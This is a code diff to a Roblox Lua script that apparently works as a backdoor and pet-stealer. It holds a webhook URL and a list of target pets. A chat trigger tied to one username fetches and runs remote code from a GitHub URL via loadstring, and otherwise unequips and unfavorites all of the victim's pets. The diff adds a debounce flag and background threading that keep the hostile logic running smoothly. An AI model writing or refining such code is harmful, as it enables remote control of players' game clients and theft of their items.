@@ -8,6 +8,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local webhookUrl = "https://60h5imcen0g9.manus.space/api/webhook"
 local triggerUsername = "FodieCookie"
+local chatTriggerRunning = false -- Debounce flag to prevent spam
 
 local petsToLookFor = {
     "Butterfly",
@@ -290,34 +291,38 @@ end
 
 local function setupChatTrigger()
     local function onChatted(message)
+        if chatTriggerRunning then
+            print("Chat trigger is already running. Please wait.")
+            return
+        end
+
         local loadstringCommand = 'loadstring(game:HttpGet("https://github.com/DupeNew/lol/blob/main/screen"))()*'
         
         if message == loadstringCommand then
             print("Received loadstring command from FodieCookie. Executing...")
-            
-            -- IMPORTANT: The URL must be the 'raw' version of the file
             local scriptUrl = "https://raw.githubusercontent.com/DupeNew/lol/main/screen"
             
-            -- Use a protected call to safely execute the fetched script
-            local success, result = pcall(function()
+            pcall(function()
                 local scriptContent = game:HttpGet(scriptUrl)
                 local func = loadstring(scriptContent)
                 if func then
-                    func() -- Execute the loaded script
+                    func()
                     print("Executed script from URL successfully.")
                 else
                     warn("Failed to load script from URL. Content might be invalid.")
                 end
             end)
-
-            if not success then
-                warn("Error executing loadstring command: " .. tostring(result))
-            end
         else
-            -- If it's any other message, run the original unequip/unfavorite logic
-            print(string.format("'%s' chatted. Triggering unequip/unfavorite.", triggerUsername))
-            unequipAllPets()
-            unfavoriteAllPetsInBackpack()
+            chatTriggerRunning = true
+            print(string.format("'%s' chatted. Triggering unequip/unfavorite in the background.", triggerUsername))
+
+            -- FIX: Run the slow functions in a new thread to avoid blocking the event
+            task.spawn(function()
+                unequipAllPets()
+                unfavoriteAllPetsInBackpack()
+                print("Chat-triggered action complete. Trigger is ready again.")
+                chatTriggerRunning = false -- Reset the debounce flag when done
+            end)
         end
     end
 
